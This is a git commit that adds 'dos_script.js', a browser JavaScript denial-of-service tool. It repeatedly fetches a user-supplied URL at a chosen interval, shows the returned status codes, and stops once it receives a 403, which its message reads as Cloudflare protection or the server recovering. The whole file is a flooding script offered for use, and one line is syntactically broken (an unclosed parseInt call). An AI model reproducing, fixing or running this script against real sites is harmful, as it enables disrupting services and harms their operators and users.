b2d859bb7d3e961149ff8b684b4daf552a42a0cd
lizalf0s <136858034+lizalf0s@users.noreply.github.com>
2023-06-17 13:00:22 -0400

    Create dos_script.js

---
+++ dos_script/dos_script.js
@@ -0,0 +1,29 @@
+document.getElementById("submit").onclick = function() {
+
+const url = document.getElementById("url").value;
+const interval = parseInt(document.getElementById("interval").value;
+
+ var evil = setInterval(async function() {
+
+var yes = await fetch(url);
+if (yes.status == 403) {
+
+document.body.insertAdjacentHTML("beforeend", `<pre>Cloudflare protection enabled. Either that or the server's up again</pre>`);
+clearInterval(evil);
+clearInterval(clear);
+return;
+}
+document.body.insertAdjacentHTML('beforeend', `<pre class="status">${yes.status}</pre>`);
+}, interval);
+
+var clear = setInterval(async function() {
+
+const elems = document.getElementsByClassName("status");
+for (var i = 0, o = elems.length; i < o; i++) {
+elems[i].remove();
+}
+
+}, 15000);
+
+
+}
